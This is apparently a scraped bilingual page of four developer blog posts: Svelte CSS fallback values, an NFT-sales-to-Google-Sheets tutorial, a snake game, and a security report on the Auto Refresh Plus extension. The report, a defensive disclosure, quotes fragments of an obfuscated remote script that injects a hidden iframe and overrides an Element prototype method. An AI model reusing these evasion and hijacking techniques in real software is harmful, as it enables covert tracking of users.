item.title: Svelte 快速提示：样式属性默认值 | Svelte quick tip: Style prop defaults
item.description:
因此，您可以在组件样式中使用CSS 自定义属性...

 <p> I have something important to say. </p> <style> p { border : 2px solid var ( --line-color ); /* Decorative styles */ padding : 1rem ; max-width : 60ch ; } </style>

但是如果你想让你的样式有一个默认值呢？ 自定义属性var语法采用第二个参数，如果该属性未定义，则该参数设置回退。 因此，如果您希望默认边框颜色为darkred ，您可以执行以下操作。

 p { border : 2px solid var ( --line-color , darkred ); }

但是，如果您想在多个地方使用--line-color并具有相同的回退，这可能会变得冗长。 如果要更新默认值，则必须在多个地方进行！

 p { border : 2px solid var ( --line-color , darkred ); text-decoration : underline wavy var ( --line-color , darkred ) 1px ; }

有两种方法可以重构它以使其不那么冗长。 首先，您可以为默认值引入另一个自定义属性：

 p { --line-color-default : darkred ; border : 2px solid var ( --line-color , var ( --line-color-default )); text-decoration : underline wavy var ( --line-color , var ( --line-color-default )) 1px ; }

这样就可以在一个地方更改默认值，但是每次引用--line-color时，您仍然必须向var提供第二个参数。

相反，我推荐的方法是引入另一个表示line-color 或 fallback 的自定义属性。

 p { --_line-color : var ( --line-color , darkred ); border : 2px solid var ( --_line-color ); text-decoration : underline wavy var ( --_line-color ) 1px ; }

所以现在你有两个变量：

  • 您可以在此Svelte REPL中看到这一点。

    如果您打算在多个地方使用主题变量，则只需要引入像--_line-color这样的变量。 否则，在您使用该属性的地方设置回退是非常好的，如第一个示例中所示。

    这里展示的技术并不是 Svelte 独有的，它可以应用于任何使用自定义属性的地方。 但是，Svelte 对它特别感兴趣，因为自定义属性是推荐的组件主题化方式。



原文:

Svelte has a built-in solution for component theming using style props. So, you can use CSS custom properties in your component styles...

<p> I have something important to say.
</p> <style> p { border: 2px solid var(--line-color); /* Decorative styles */ padding: 1rem; max-width: 60ch; } </style>

...and easily set them from outside the component using style props.

<TextBox --line-color="mediumspringgreen"></TextBox>

But what if you want your style to have a default value? The custom property var syntax takes a second argument that sets a fallback if the property is not defined. So, if you wanted the default border color to be darkred, you could do the following.

p { border: 2px solid var(--line-color, darkred);
}

However, this can get verbose if you want to use --line-color in multiple places, with the same fallback. If you want to update the default value, you have to do it multiple places!

p { border: 2px solid var(--line-color, darkred); text-decoration: underline wavy var(--line-color, darkred) 1px;
}

There’s two ways to refactor this to make it less verbose. First, you could introduce another custom property for the default value:

p { --line-color-default: darkred; border: 2px solid var(--line-color, var(--line-color-default)); text-decoration: underline wavy var(--line-color, var(--line-color-default)) 1px;
}

This makes it so there’s one place to change the default value, but you still have to provide the second argument to var every time you reference --line-color.

Instead, my recommended approach would be to introduce another custom property that represents either line-color or the fallback.

p { --_line-color: var(--line-color, darkred); border: 2px solid var(--_line-color); text-decoration: underline wavy var(--_line-color) 1px;
}

So now you have two variables:

  • --line-color is the user-supplied theme value
  • --_line-color is what we use in our styles, and will either be the user-supplied value (if defined) or the default color

You can see this in action in this Svelte REPL.

You only need to introduce a variable like --_line-color if you plan on using the theme variable multiple places. Otherwise, it’s perfectly fine to set the fallback where you use the property, as in the first example.

The technique on display here is not unique to Svelte, and can be applied anywhere you use custom properties. However, it's of particular interest with Svelte, since custom properties are the recommended way of theming a component.
item.author: geoffrich

item.title: [安全报告] Auto Refresh Plus 的可疑行为 | [Security Report] Suspicious Behavior of Auto Refresh Plus
item.description:
大竹琢磨

发表于大家好。
这是预先用日语发表的文章（链接）的英文翻译和修改。

最近在开发 Web 应用程序时，我注意到一个不熟悉的第三方 cookie 附加到我正在开发的页面上。
经过仔细检查，我发现 cookie 是由浏览器扩展Auto Refresh Plus发出的，但它的行为非常可疑，因此我决定写这篇文章，因为它有大量的用户（超过 40 万）。 总之，我认为我应该停止使用这个扩展。

什么是利害攸关的

要寻找的可疑点数不胜数，但特别是以下几点真的很糟糕。

毫无意义和可疑的沟通

每次用户访问某个站点时，此扩展程序似乎都与名为“3001.scriptcdn.net”的站点进行通信。 顾名思义，这是一个将 JavaScript 文件和其他文件放置在外部 CDN（内容交付网络）上并可以在需要时下载的站点。 令人惊讶的是，除了这个扩展之外，这个站点没有用于任何其他用途，因为在域 scriptcdn.net 上的 Google 搜索不会找到一个单一的技术文档。 此外，令人怀疑的是，正在传输和下载的脚本文件对于扩展的工作是否必不可少。 这是因为部分下载的脚本如下

文件的 URL（引用自）： https ://3001.scriptcdn.net/code/static/1


 _0x32b3['fbQbAp'] = function(_0x38a00c) { var _0x37db2d = _0x31b03b(_0x38a00c); var _0x4cf70a = []; for (var _0x3c7b92 = 0x3a4 + 0x18a * -0x1 + -0x21a, _0x18c768 = _0x37db2d['length']; _0x3c7b92 < _0x18c768; _0x3c7b92++) { _0x4cf70a += '%' + ('00' + _0x37db2d['charCodeAt'](_0x3c7b92)['toString'](0x18f3 + 0x12e0 + 0x11 * -0x293))['slice'](-(0x24d9 + -0x1bca * 0x1 + 0x14b * -0x7)); } return decodeURIComponent(_0x4cf70a); }
 case '2': var _0x3ea808 = document['createElem' + 'ent'](_0x42e59b[_0x4c9219(-0x389, -0x2f9, -0x2fa, -0x26e)]); continue; case '3': Element[_0x3f3a92(-0x3ae, -0x2d5, -0x195, -0x407)][_0x4c9219(-0x527, -0x539, -0x469, -0x68c) + 'd'] = _0x481455['contentWin' + _0x4c9219(-0x334, -0x486, -0x44b, -0x34e)][_0x4c9219(-0x364, -0x36b, -0x254, -0x498)]['prototype'][_0x4c9219(-0x416, -0x539, -0x527, -0x3fc) + 'd']; continue; case '4': _0x481455[_0x4c9219(-0x478, -0x409, -0x337, -0x2e1)]['display'] = _0x42e59b['KUtJZ']; continue; case '5': _0x481455['src'] = _0x42e59b[_0x3f3a92(-0x493, -0x4bc, -0x5ed, -0x578)]; continue; case '6': document['body']['appendChil' + 'd'](_0x481455); continue;

乍一看，这个文件看起来像是一个写出要执行的程序的程序，而不是要执行的程序本身。 而且，“‘createElement’”的使用故意写成“‘createElem’+‘ent’”，似乎是为了避免被安全软件检测到。 此外，该文件还包含成人网站域列表。 这些不符合扩展的最初目的，显然是不自然的。 更重要的是，与本网站通信时发出的 cookie（如上所述）存储了两个可用于识别用户的令牌。 考虑到每次用户访问某个站点时都会进行通信这一事实，可以安全地假设这些令牌用于跟踪用户。 通常，扩展工作所需的脚本包含在安装文件中，因此每次用户从一个页面移动到另一个页面时都下载它们是不自然的。 即使扩展程序没有做任何可疑的事情，如果每次访问页面时都下载它也不是一件好事，因为它会减慢网站的加载速度（我使用的其他扩展程序不会以这种方式运行）。

顺便说一句，隐私政策说“我们不跟踪任何网站、网站使用情况等”。 写如下。

根本没有提供有关提供商的信息

有关提供此扩展的组织（或个人）的信息将被彻底隐瞒。
例如，chrome web store 中的开发者信息链接仅指向扩展的产品站点（ autorefresh.io ），唯一的支持联系人是产品站点上的联系表。 隐私政策中有一个用于个人信息查询的电子邮件地址，但由于该地址的域是autorefresh.io，因此尚不清楚究竟是谁处理此类查询。 如果您没有收到对您的电子邮件的回复，我们将无能为力，因为我们不知道公司名称（或公司名称）、电话号码或地址。

当然，使用 Cloudflare 可以很好地隐藏域名和 IP 地址。

他们不是自己做的

以下内容发布在此扩展程序的评论部分。

一位用户声称此扩展程序是“被盗”的。

我们已经调查了这篇文章的真实性，并确认确实在此扩展发布之前发布了具有相同名称和相同功能的扩展。
来源： https ://community.servicenow.com/community?id=community_question&sys_id=af0cafd9db3317c0200f0b55ca961940 但是，我们无法验证上面帖子中提到的“被盗”，因为扩展的原始版本已经关闭上市。 然而，提供现在公开可用的扩展的组织（或个人）确实没有开发扩展/出于某种原因重新发布了他们自己已经公开可用的扩展。 我们必须假设他们在某些特殊情况下会费心重新发布具有所有功能的免费产品，并且根本不会产生任何收入。

原版网址： https ://chrome.google.com/webstore/detail/auto-refresh-plus/ohfjpkccecpdfkpmfocndhepolhljfhg


当前发布的扩展地址： https ://chrome.google.com/webstore/detail/auto-refresh-plus-page-mo/hgeljhfekpckiplhkigfehkdpldcggm

应采取的应对措施

如果您正在使用此扩展程序，我们建议您立即将其卸载。 如果这不可能，请至少关闭“允许以隐身模式运行”。 另外，如果您是技术人员，请帮助我们验证扩展程序的行为。 验证行为后，如果您发现与本文所述相同的行为，请向商店报告。

笔记

  • 本文包含原创研究。 请自行承担使用本文中的信息的风险。
  • 本文内容仅为研究推测，并不暗示其绝对真实。 本文无意诽谤或诽谤任何第三方。 它也不打算造成任何不利。 感谢您阅读到最后。

迪普·K·萨西哈兰—— Apr 11 4月11日



原文:

Takuma Otake

Posted on Apr 28

Hello everybody.
This is an English translation and modification of the article (link) posted in Japanese in advance.

Recently while developing a web app, I noticed an unfamiliar third party cookie attached to a page I was developing.
Upon closer inspection, I discovered that the cookie was issued by the browser extension Auto Refresh Plus, but its behavior is so suspicious that I decided to write this article in light of the large number of users (over 400,000). In conclusion, I think I should stop using this extension.

*Please uninstall the program as it will continue to run as long as it exists in your browser.

What's at stake

There is no end to the number of suspicious points to look for, but the following points in particular are really bad.

Pointless and dubious communication

example.com is a site that does not normally grant cookies.

This extension seems to communicate with a site called "3001.scriptcdn.net" every time a user visits some site. The name suggests that this is a site where JavaScript files and other files are placed on an external CDN (Content Delivery Network) and can be downloaded when needed. Surprisingly, this site is not used for anything other than this extension, because a Google search on the domain scriptcdn.net does not turn up a single technical document. Also, it is doubtful that the script files being communicated and downloaded are essential for the extension to work. This is because some of the downloaded scripts are as follows

URL of the file (cited from): https://3001.scriptcdn.net/code/static/1


_0x32b3['fbQbAp'] = function(_0x38a00c) {
    var _0x37db2d = _0x31b03b(_0x38a00c);
    var _0x4cf70a = [];
    for (var _0x3c7b92 = 0x3a4 + 0x18a * -0x1 + -0x21a, _0x18c768 = _0x37db2d['length']; _0x3c7b92 < _0x18c768; _0x3c7b92++) {
        _0x4cf70a += '%' + ('00' + _0x37db2d['charCodeAt'](_0x3c7b92)['toString'](0x18f3 + 0x12e0 + 0x11 * -0x293))['slice'](-(0x24d9 + -0x1bca * 0x1 + 0x14b * -0x7));
    }
    return decodeURIComponent(_0x4cf70a);
}

case '2':
    var _0x3ea808 = document['createElem' + 'ent'](_0x42e59b[_0x4c9219(-0x389, -0x2f9, -0x2fa, -0x26e)]);
    continue;
case '3':
    Element[_0x3f3a92(-0x3ae, -0x2d5, -0x195, -0x407)][_0x4c9219(-0x527, -0x539, -0x469, -0x68c) + 'd'] = _0x481455['contentWin' + _0x4c9219(-0x334, -0x486, -0x44b, -0x34e)][_0x4c9219(-0x364, -0x36b, -0x254, -0x498)]['prototype'][_0x4c9219(-0x416, -0x539, -0x527, -0x3fc) + 'd'];
    continue;
case '4':
    _0x481455[_0x4c9219(-0x478, -0x409, -0x337, -0x2e1)]['display'] = _0x42e59b['KUtJZ'];
    continue;
case '5':
    _0x481455['src'] = _0x42e59b[_0x3f3a92(-0x493, -0x4bc, -0x5ed, -0x578)];
    continue;
case '6':
    document['body']['appendChil' + 'd'](_0x481455);
    continue;

At a glance, this file looks like a program for writing out a program to be executed, rather than a program itself to be executed. Moreover, the use of "'createElement'" is deliberately written as "'createElem' + 'ent'", which seems to be an attempt to avoid detection by security software. In addition, the file also contains a list of adult site domains. These are not in line with the original purpose of the extension and are clearly unnatural. More to the point, the cookie issued when communicating with this site (as mentioned above) stores two tokens that can be used to identify the user. Considering the fact that the communication is made every time the user accesses some site, it is safe to assume that these tokens are used to track the user. Generally, the scripts necessary for extensions to work are included in the installation file, so it would be unnatural for them to be downloaded every time the user moves from one page to another. Even if the extension is not doing anything at all suspicious, it is not a good thing if it downloads every time you visit a page, because it slows down the loading of the site (other extensions I use do not behave in this way).

By the way, the privacy policy says "We do not track any websites, website usage, etc." is written as follows.

No information on the provider is provided at all

Information about the organization (or individual) providing this extension is thoroughly withheld.
For example, the developer information link in the chrome web store only leads to the extension's product site (autorefresh.io), and the only support contact is a contact form on the product site. There is an email address in the privacy policy for personal information inquiries, but since the domain of that address is autorefresh.io, it is not clear who exactly handles such inquiries. If you do not receive a reply to your email, there is nothing we can do because we do not know the company name (or name of the company), phone number, or address.

Of course, both the domain name and IP address are well hidden using Cloudflare.

They didn't make it themselves

The following was posted in the review section of this extension.

One user claims that this extension is "stolen".

We have investigated the authenticity of this post and have confirmed that indeed, an extension with the same name and the same functionality was published before this extension was released.
Source: https://community.servicenow.com/community?id=community_question&sys_id=af0cafd9db3317c0200f0b55ca961940 However, we were not able to verify the "stolen" mentioned in the post above, as the original version of the extension has already been closed to the public. However, it is true that the organization (or individual) providing the extensions that are now publicly available did not develop the extensions/re-released the extensions that were already publicly available on their own for some reason. We have to assume that there was some special circumstance for them to go to the trouble of re-releasing something that is available with all the features for free and does not generate any revenue at all.

URL of the original version: https://chrome.google.com/webstore/detail/auto-refresh-plus/ohfjpkccecpdfkpmfocndhepolhljfhg


URL of the currently released extension: https://chrome.google.com/webstore/detail/auto-refresh-plus-page-mo/hgeljhfekpckiiplhkigfehkdpldcggm

Responses to be taken

If you are using this extension, we recommend that you uninstall it immediately. If this is not possible, please at least turn off "Allow to run in incognito mode". Also, if you are a technician, please help us verify the behavior of the extension. Once you have verified the behavior, please report to the store if you see the same behavior as described in this article.

*I have reported it to Chrome Web Store and Microsoft Edge add-on store.

Notes

  • This article contains original research. Please use the information in this article at your own risk.
  • The content of this article is only speculation based on research, and is not intended to imply that it is absolutely true. This article is not intended to defame or slander any third party. It is also not intended to cause any disadvantage. ## Lastly It has been a long article explaining many things. Thank you for reading to the end.

Yahye Abdirahman - Mar 15

Deepu K Sasidharan - Apr 11
item.author: bigbamboojp

item.title: 使用 Sort 神奇地将 Moonbirds NFT 销售导入 Google 表格 | Magically import Moonbirds NFT sales into Google Sheets using Sort
item.description:
使用Sort API ，我们可以将任何以太坊交易数据输入 Google Sheets。 特别是对于Moonbirds ，我们可以为 Moonbirds 创建嵌套鸟类、销售、转让或在区块链上发生的任何事件的 Google 表格。 对于本教程，我们将专注于销售（跨 OpenSea、LooksRare 和 Rarible 交易所，Coinbase 即将推出）。

我们将专注于单个交易，为了简化教程，我们将使用一个名为SyncWith的 Google 表格插件，该插件可用于发送 API 调用并将结果存储在 Google 表格中。

安装 SyncWith Google 表格插件

  1. 打开一个新的Google Sheet，在菜单栏中，点击“Extensions” -> “Add-ons” -> “Get add-ons”，搜索“SyncWith”并安装。

  2. 安装插件后，通过“扩展”->“SyncWith”->“管理连接”访问插件

  3. 滚动到“SyncWith”应用程序的最底部，然后单击“自定义”

  4. 使用 JSON 正文创建 POST 请求

创建排序 API 请求

让我们为 Moonbirds 数据制定 API 请求

帖子正文：

 { "nft_event": "sale", "nft_address": "0x23581767a106ae21c074b2276D25e5C3e136a68b", "limit" : 50, "fields" : { "nft" : 1 } }
  • 限制：从 API 请求返回的结果数（最大值为 250，要进一步返回历史数据，请使用“时间戳”字段）
  • 字段：响应会很大，我们只返回“nft”字段（包括所有有用的 NFT 数据），而忽略其他数据，例如日志和函数参数。 要同时包含时间戳，请将此值更改为 { "timestamp" : 1, "nft" : 1 }

现在将 API 请求放入“SyncWith”中

点击预览

塑造数据结果

删除“id”、“status”和“object”字段（通过单击垃圾桶图标），单击“result”字段上的“expand”

接下来，“展开”“nft”字段，单击“更新”。

全部做完！ 您应该在 Google 表格中有一份最新的 Moonbirds 销售列表！

您可以继续进一步扩展“属性”列，指定不同的日期来获取历史数据（使用“时间戳”API 字段），或者进行更详细的分析。

我们也可以做其他事情，比如寻找执行了“toggleNesting”功能的区块链交易（在鸟巢/未巢时执行）：

 { "contract_address": "0x23581767a106ae21c074b2276d25e5c3e136a68b", "contract_function": "toggleNesting", "limit" : 50 }

希望这是使用Sort API将数据导入 Google 表格的一个很好的入门。 请访问我们的Discord提出任何问题，或继续关注使用 Moonbirds 交易数据的更多教程。



原文:

Using the Sort API, we can get any Ethereum transaction data into Google Sheets. Specifically for Moonbirds, we can create a Google Sheet of nesting birds, sales, transfers, or any event that occurred on the blockchain for Moonbirds. For this tutorial, we'll focus on sales (across OpenSea, LooksRare, and Rarible exchanges, Coinbase coming soon).

The Sort API allows us to look at individual blockchain transactions, or even perform millisecond aggregations (average, sum, etc, useful for charting). We'll focus on the individual transactions, and to simplify the tutorial, we'll use a Google Sheets plugin called SyncWith, useful for sending API calls and storing the result in a Google Sheet.

Install SyncWith Google Sheets Add-on

  1. Open a new Google Sheet, in the menu bar, click "Extensions" -> "Add-ons" -> "Get add-ons", search for "SyncWith" and install.

  2. After the plugin is installed, visit the plugin via "Extensions" -> "SyncWith" -> "Manage Connections"

  3. Scroll to the very bottom of the "SyncWith" app and click "Custom"

  4. Create a POST request with a JSON body

Create a Sort API Request

Let's formulate our API request for Moonbirds data

API endpoint:

https://api.sort.xyz/v0/transaction

POST body:

{
  "nft_event": "sale",
  "nft_address": "0x23581767a106ae21c074b2276D25e5C3e136a68b",
  "limit" : 50,
  "fields" : { "nft" : 1 }
}
  • nft_event: only look for sales
  • nft_address: contract address of NFT
  • limit: number of results to return from API request (max is 250, to go further back for historical data, use the "timestamp" field)
  • fields: the responses will be large, let's only return the "nft" field (which includes all useful NFT data), and leave out other data such as logs and function parameters. To also include a timestamp, change this value to { "timestamp" : 1, "nft" : 1 }

(if you're familiar with Dune Analytics, think of Sort as an API-first version of Dune)

Now put the API request in "SyncWith"

Click Preview

Shape the data result

There is a list of results in the "result" field.

Delete the "id", "status", and "object" fields (by clicking the trash can icon), click "expand" on the "result" field

Next, "expand" the "nft" field, click "Update".

All done! You should have a list of the latest Moonbirds sales in Google Sheets!

You can continue further to expand the "attributes" column, specify different dates to get historical data (using the "timestamp" API field), or perform more detailed analysis.

We can do other things too, such as looking for blockchain transactions that have executed the "toggleNesting" function (executed when a bird nests/un-nests):

{
  "contract_address": 
  "0x23581767a106ae21c074b2276d25e5c3e136a68b",
  "contract_function": "toggleNesting",
  "limit" : 50
}

Hopefully this has been a good primer on using the Sort API to get data into Google Sheets. Please visit us in Discord to ask any questions, or stay tuned for more tutorials using Moonbirds transaction data.
item.author: sort_xyz

item.title: 带有现场高分板的复古主题蛇游戏！ | Retro themed snake game with live highscore board!
item.description:
我的灵感来自于我小时候在我父亲的手机里玩的流行的诺基亚蛇游戏。 我玩得很开心。 此外，我的朋友过去常常吹嘘他们的分数，但没有记分牌来跟踪他们。 这就是为什么我决定用高分板建造一个🤠。

为了让它更有趣和更具挑战性，我添加了一点点扭曲。 每当出现金色水果时，您将获得 50 分以上，但有 20% 的机会您的分数将减少 50 分😜。 那么你愿意接受挑战吗？ 与您的朋友竞争并在排行榜上名列前茅！

立即播放： Snake Arcade

提交类别：

古怪的通配符

代码链接：

贪吃蛇街机是流行的诺基亚贪吃蛇游戏的复古主题衍生产品。 现在玩并与您的朋友竞争以登上高分榜！

链接： https ://snake-arcade-bck7y.ondigitalocean.app/

npm start

在开发模式下运行应用程序。
打开http://localhost:3000在浏览器中查看。

当您进行更改时，该页面将重新加载。
您可能还会在控制台中看到任何 lint 错误。

npm run build

将用于生产的应用程序构建到build文件夹。
它在生产模式下正确捆绑 React 并优化构建以获得最佳性能。

构建被缩小并且文件名包含哈希。
您的应用已准备好部署！

附加信息：

免责声明：所有音效和音乐均取自OpenGameArt.org ，这是一个媒体存储库，旨在...

附加信息：

我使用 Appwrite 的数据库来存储玩家的高分，并使用它的实时功能来更新记分牌。 前端和 Appwrite docker 都部署在DigitalOcean上。

演示视频：

谢谢开发和应用程序！

这是我第一次使用 Appwrite。 它非常简单易学，任何初学者都可以在他们的项目中使用它。 我会推荐大家使用Appwrite 🚀。



原文:

Snake Arcade is a retro themed snake game with a live highscore board. I took this inspiration from the popular Nokia snake game which I used to play in my dad's mobile back when I was a kid. I had so much fun playing it. Moreover my friends used to brag about their scores but there's was no scoreboard to track them. And that's why I decided to build one with a highscore board 🤠.

To make it more fun and challenging I have added a little twist. Whenever the golden fruit appears, you get 50 points more but there's a 20% chance that your score will be reduced by 50 points 😜. So are you willing to take the challenge? Compete with your friends and top the leaderboard!

Play now: Snake Arcade

Submission Category:

Wacky Wildcards

Link to Code:

Snake arcade is a retro themed spinoff of the popular Nokia snake game. Play now and compete with your friends to top the high scoreboard!

Link: https://snake-arcade-bck7y.ondigitalocean.app/

npm start

Runs the app in the development mode.
Open http://localhost:3000 to view it in your browser.

The page will reload when you make changes.
You may also see any lint errors in the console.

npm run build

Builds the app for production to the build folder.
It correctly bundles React in production mode and optimizes the build for the best performance.

The build is minified and the filenames include the hashes.
Your app is ready to be deployed!

Additional Info:

Snake Arcade uses Appwrite to store the score of every player in its database. The Appwrite instance is hosted at DigitalOcean.

Disclaimer: All the sound effects and music have being taken from OpenGameArt.org which is a media repository intended for…

Additional Info:

I have used Appwrite's database to store the highscores of the players and also used its realtime feature to update the scoreboard. Both the frontend and the Appwrite docker is deployed at DigitalOcean.

Demo video:

Thank you Dev & Appwrite!

This is my first time using Appwrite. Its so simple and easy to learn that any beginners can use it in their project. I would recommend everyone to use Appwrite 🚀.
